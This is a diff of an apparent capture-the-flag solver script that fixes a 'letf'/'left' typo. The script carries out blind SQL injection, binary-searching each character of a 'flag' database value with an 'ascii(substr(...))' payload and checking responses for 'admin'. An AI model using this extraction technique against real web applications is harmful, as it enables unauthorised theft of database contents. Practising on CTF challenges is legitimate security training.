@@ -16,10 +16,10 @@ i = 0
   
 while True:
     i = i + 1
-    letf = 32
+    left = 32
     right = 127
-    while letf < right:
-        mid = (letf+right) // 2
+    while left < right:
+        mid = (left+right) // 2
 
         ## payload
         # payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"  # 第一种解法(if判断)
@@ -37,11 +37,11 @@ while True:
         res = requests.get(url=url, params=data).text
         time.sleep(0.005)
         if "admin" in res:
-            letf = mid + 1
+            left = mid + 1
         else:
             right = mid
-    if letf != 32:
-        flag += chr(letf)
+    if left != 32:
+        flag += chr(left)
     else:
         break
 print(flag)
